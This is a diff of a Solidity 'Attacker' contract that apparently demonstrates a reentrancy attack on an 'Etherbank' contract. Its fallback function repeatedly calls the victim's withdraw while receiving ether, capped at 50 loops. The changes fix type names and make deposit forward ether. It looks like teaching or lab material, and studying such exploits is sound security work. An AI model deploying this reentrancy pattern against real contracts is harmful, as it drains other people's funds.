@@ -3,13 +3,12 @@ pragma solidity ^0.4.19;
 import "./Etherbank.sol";
 
 contract Attacker{
-    EtherBank victim;
+    Etherbank victim;
     int private counter;
     bool isAttack = false; 
 
     event Withdrawl(
         address indexed from,
-        bytes32 indexed id,
         uint value
     );
 
@@ -19,34 +18,33 @@ contract Attacker{
         string value
     );
 
-    constructor(address _etherBank) public {
-        victim = EtherBank(_etherBank);
+    constructor(address _etherbank) public {
+        victim = Etherbank(_etherbank);
     }
 
-    function deposit() public {
+    function deposit() public payable {
         emit Deposit(address(victim), 10, "Deposit");
-        address(victim).transfer(10);
+        victim.deposit.value(msg.value)(tx.origin);
     }
 
 
     function attack() public {
         isAttack = true;
-        emit Withdrawl(msg.sender, 1, msg.value);
-        victim.withdraw(10);
+        emit Withdrawl(address(victim), 1);
+        victim.withdraw(1);
     }
 
     function getCount() public view returns (int) {
         return counter;
     }
 
-    function getEtherBankAddress() public view returns (EtherBank) {
+    function getEtherbankAddress() public view returns (Etherbank) {
         return victim;
     }
 
-
     function() public payable {
-        if(isAttack) {
-            emit Withdrawl(msg.sender, 1, msg.value);
+        if(isAttack && counter < 50) {
+            emit Withdrawl(msg.sender, 10);
             victim.withdraw(10);
             counter += 1;
         }
@@ -54,5 +52,4 @@ contract Attacker{
            emit Deposit(msg.sender, msg.value, "Deposit"); 
         }
     }
-    
 }
